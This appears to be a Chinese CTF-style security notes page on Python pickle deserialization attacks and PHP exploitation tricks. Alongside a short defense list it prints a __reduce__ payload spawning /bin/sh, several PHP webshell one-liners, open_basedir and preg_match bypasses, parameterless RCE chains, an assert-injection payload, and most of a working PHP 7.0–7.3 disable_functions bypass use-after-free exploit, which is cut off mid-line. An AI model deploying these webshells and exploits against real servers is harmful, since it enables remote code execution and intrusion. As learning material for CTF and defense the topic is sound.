<h3 id="为什么要实现序列化和反序列化？"><a href="#为什么要实现序列化和反序列化？" class="headerlink" title="为什么要实现序列化和反序列化？"></a>为什么要实现序列化和反序列化？</h3><p> 和其他语言的序列化一样，Python 的序列化的目的也是为了保存、传递和恢复对象的方便性，在众多传递对象的方式中，序列化和反序列化可以说是最简单和最容易实现的方式 </p>
<h4 id="1-几个重要的函数"><a href="#1-几个重要的函数" class="headerlink" title="1.几个重要的函数"></a>1.几个重要的函数</h4><p>Python 为我们提供了两个比较重要的库 pickle 和 cPickle以及几个比较重要的函数来实现序列化和反序列化</p>
<p>序列化：</p>
<ul>
<li>pickle.dump(文件) </li>
<li>pickle.dumps(字符串)</li>
</ul>
<p>反序列化:</p>
<ul>
<li><p>pickle.load(文件)</p>
</li>
<li><p>pickle.loads(字符串)</p>
<p>但是底层是怎么实现的呢？这里就不得不提及 PVM(python 虚拟机) 了，它是实现 Python 序列化和反序列化的最根本的东西 </p>
<p>PVM 由三个部分组成，引擎（或者叫指令分析器），栈区、还有一个 Memo (这个我也不知道怎么解释，我们姑且叫它 “标签区“) </p>
</li>
</ul>
<p><strong>1.引擎的作用</strong></p>
<p>从头开始读取流中的操作码和参数，并对其进行处理,在这个过程中改变 栈区 和 标签区，处理结束后到达栈顶，形成并返回反序列化的对象</p>
<p><strong>2.栈区的作用</strong></p>
<p>作为流数据处理过程中的暂存区，在不断的进出栈过程中完成对数据流的反序列化，并最终在栈上生成发序列化的结果</p>
<p><strong>3.标签区的作用</strong></p>
<p>数据的一个索引或者标记</p>
<p>我们现在来结合我们上面讲述的 PVM 的操作码看这个文件中的字符串是怎么一步一步执行的</p>
<p>(1)c 后面是模块名，换行后是类名,于是将 os.system 放入栈中<br>(2)( 这个是标记符，我们将一个 Mark 放入栈中<br>(3)S 后面是字符串，我们放入栈中<br>(4)t 将栈中 Mark 之前的内容取出来转化成元祖，再存入栈中 （’/bin/sh’,），同时标记 Mark 消失<br>(5)R 将元祖取出，并将 callable 取出，然后将元祖作为 callable 的参数，并执行，对应这里就是 os.system(‘/bin/sh’),然后将结果再存入栈中</p>
<p> 相比于 PHP 反序列化必须要依赖于当前代码中类的存在以及方法的存在，Python 凭借着自己彻底的面向对象的特性完胜 PHP ，Python 除了能反序列化当前代码中出现的类(包括通过 import的方式引入的模块中的类)的对象以外，还能利用其彻底的面向对象的特性来反序列化使用 types 创建的匿名对象（这部分内容在后面会有所介绍），这样的话就大大拓宽了我们的攻击面。 </p>
<h3 id="反序列化漏洞往往出现在什么地方"><a href="#反序列化漏洞往往出现在什么地方" class="headerlink" title="反序列化漏洞往往出现在什么地方"></a>反序列化漏洞往往出现在什么地方</h3><h4 id="通常在解析认证token，session的时候"><a href="#通常在解析认证token，session的时候" class="headerlink" title="通常在解析认证token，session的时候"></a><strong>通常在解析认证token，session的时候</strong></h4><p> 现在很多web都使用redis、mongodb、memcached等来存储session等状态信息。P神的文章就有一个很好的redis+python反序列化漏洞的很好例子：<a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html。" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html。</a> </p>
<h4 id="可能将对象Pickle后存储成磁盘文件"><a href="#可能将对象Pickle后存储成磁盘文件" class="headerlink" title="可能将对象Pickle后存储成磁盘文件"></a><strong>可能将对象Pickle后存储成磁盘文件</strong></h4><h4 id="可能将对象Pickle后在网络中传输"><a href="#可能将对象Pickle后在网络中传输" class="headerlink" title="可能将对象Pickle后在网络中传输"></a><strong>可能将对象Pickle后在网络中传输</strong></h4><p> 其实，最常见的也是最经典的也就是我们的第一点，也就是 flask 配合 redis 在服务端存储 session 的情景，这里的 session 是被 pickle 序列化进行存储的，如果你通过 cookie 进行请求 sessionid 的话，session 中的内容就会被反序列化，看似好像是没有什么问题,因为 session 是存储在 服务端的，但是终究是抵不住 redis 的未授权访问，如果出现未授权的话，我们就能通过 set 设置自己的 session ,然后通过设置 cookie 去请求 session 的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的 </p>
<h3 id="利用反序列化漏洞"><a href="#利用反序列化漏洞" class="headerlink" title="利用反序列化漏洞"></a>利用反序列化漏洞</h3><p> 利用的关键点还是如何构造我们的反序列化的 payload，这时候就不得不提到 <code>__reduce__</code> 这个魔法方法了 </p>
<p> 如果pickle的数据包含了自定义的扩展类（比如使用C语言实现的Python扩展类）时，就需要通过实现<code>__reduce__</code>方法来控制行为了 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        a = <span class="string">'/bin/sh'</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line">a = A()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line"><span class="keyword">print</span> test</span><br></pre></td></tr></table></figure>

<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p> (1) 不要再不守信任的通道中传递 pcikle 序列化对象<br>(2) 在传递序列化对象前请进行签名或者加密，防止篡改和重播<br>(3) 如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据<br>(4) 将 pickle 加载的数据列入白名单 </p>
<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p> <a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a> </p>
<p>python反序列化打redis</p>
<p>参考链接： [<a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/]" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/]</a>(<a href="https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之Python" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之Python</a> 反序列化漏洞/) </p>
<p> <a href="https://www.smi1e.top/从balsn-ctf-pyshv学习python反序列化/" target="_blank" rel="noopener">https://www.smi1e.top/%e4%bb%8ebalsn-ctf-pyshv%e5%ad%a6%e4%b9%a0python%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96/</a> </p>
<h2 id="php-1"><a href="#php-1" class="headerlink" title="php"></a>php</h2><p>可以命令执行的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,mb_send_mail,assert,dl,set_time_limit,ignore_user_abort,symlink,link,map_open,imap_mail,ini_set,ini_alter</span><br></pre></td></tr></table></figure>

<h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><p>一句话</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[m]);?&gt;</span><br></pre></td></tr></table></figure>

<p>短标签</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=`$_GET[<span class="number">1</span>]`;</span><br></pre></td></tr></table></figure>

<p>过滤&lt;?</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;@<span class="keyword">eval</span>($_POST[sb])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>字符串拼接</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = <span class="string">"abcde"</span>;</span><br><span class="line">$s = substr($str,<span class="number">-1</span>,<span class="number">1</span>);</span><br><span class="line">$ev = $s .<span class="string">'val'</span>;</span><br><span class="line">$ev($_POST[<span class="string">'s'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&apos;img&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);echo(file_get_contents(&apos;flag&apos;));</span><br></pre></td></tr></table></figure>

<p>当phpinfo中没有限制ini_set的时候可以使用这种方法来绕过disable_function（SUCTF 2019）</p>
<p>通过scandir和file_get_contents来读文件</p>
<blockquote>
<p>chdir(‘upload’);ini_set(‘open_basedir’,’..’);chdir(‘..’);chdir(‘..’);chdir(‘..’);chdir(‘..’);ini_set(‘open_basedir’,’/‘);var_dump(scandir(‘/‘));var_dump(file_get_contents(‘../../../../THis_Is_tHe_F14g’));</p>
</blockquote>
<h3 id="绕过preg-match"><a href="#绕过preg-match" class="headerlink" title="绕过preg_match"></a>绕过preg_match</h3><p>代码如下时，且存在.htaccess</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/[^a-z\.]/"</span>, $filename) == <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>通过设置.htaccess</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure>

<p>导致preg_match返回False，继而绕过了正则判断</p>
<h3 id="无参数命令执行"><a href="#无参数命令执行" class="headerlink" title="无参数命令执行"></a>无参数命令执行</h3><p>主要参考飘零师傅的文章：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p>
<p>和bytectf 2019的boring code</p>
<p>echo(next(file(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))))));</p>
<h3 id="奇技淫巧"><a href="#奇技淫巧" class="headerlink" title="奇技淫巧"></a>奇技淫巧</h3><h4 id="assert命令注入"><a href="#assert命令注入" class="headerlink" title="assert命令注入"></a>assert命令注入</h4><p>php5</p>
<p>漏洞代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;,&apos;a&apos;) or system(&quot;cat templates/flag.php&quot;);//</span><br></pre></td></tr></table></figure>

<h4 id="查找未被过滤的函数"><a href="#查找未被过滤的函数" class="headerlink" title="查找未被过滤的函数"></a>查找未被过滤的函数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array=get_defined_functions();</span><br><span class="line"><span class="keyword">foreach</span>($array[<span class="string">'internal'</span>] <span class="keyword">as</span> $arr)&#123;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9\'"\`$&amp;.,|[&#123;_defgops\x7F]+/i'</span>, $arr) ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> ( strlen(count_chars(strtolower($arr), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">print</span>($arr.<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="7-1以下通杀绕过disable-function"><a href="#7-1以下通杀绕过disable-function" class="headerlink" title="7.1以下通杀绕过disable_function"></a>7.1以下通杀绕过disable_function</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment"># released as of 04/10/2019, specifically:</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># PHP 7.0 - 7.0.33</span></span><br><span class="line"><span class="comment"># PHP 7.1 - 7.1.31</span></span><br><span class="line"><span class="comment"># PHP 7.2 - 7.2.23</span></span><br><span class="line"><span class="comment"># PHP 7.3 - 7.3.10</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line">pwn(<span class="string">"uname -a"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span><span class="params">($ptr, $m = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $out = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(&amp;$str, $p, $v, $n = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span><span class="params">($addr, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span><span class="params">($base)</span> </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span><span class="params">($base, $elf)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $text_size) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'constant' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $text_size) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'bin2hex' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span><span class="params">($binary_leak)</span> </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span><span class="params">($basic_funcs)</span> </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $ryat;</span><br><span class="line">        <span class="keyword">var</span> $chtg;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">'WIN'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'This PoC is for *nix systems only.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(<span class="string">'A'</span>, <span class="number">79</span>);</span><br><span class="line">    $poc = <span class="string">'a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:"ryat":2:&#123;s:4:"ryat";R:3;s:4:"chtg";i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;'</span>;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line">    $v = [];</span><br><span class="line">    $v[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    $abc = $out[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> <span class="params">($x)</span> </span>&#123; &#125;;</span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"UAF failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't 